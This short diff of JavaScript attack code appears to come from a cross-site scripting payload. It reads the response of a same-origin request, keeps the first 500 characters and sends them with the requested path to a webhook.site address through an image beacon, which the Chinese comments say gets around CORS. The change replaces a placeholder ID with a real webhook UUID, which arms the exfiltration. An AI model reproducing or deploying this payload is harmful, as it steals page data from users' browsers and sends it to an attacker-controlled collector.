@@ -18,7 +18,7 @@
             if (xhr.status === 200 && xhr.responseText.length > 0) {
                 var resData = xhr.responseText.substring(0, 500); // 截取前500字符
                 // 用图片外带，避免跨域 XHR 的 CORS 限制
-                new Image().src = 'https://webhook.site/你的专属ID?path=' + encodeURIComponent(path) + '&data=' + encodeURIComponent(resData);
+                new Image().src = 'https://webhook.site/1aceba09-6f1f-4bd8-afca-dab0603f504f?path=' + encodeURIComponent(path) + '&data=' + encodeURIComponent(resData);
             }
         };
         xhr.send();
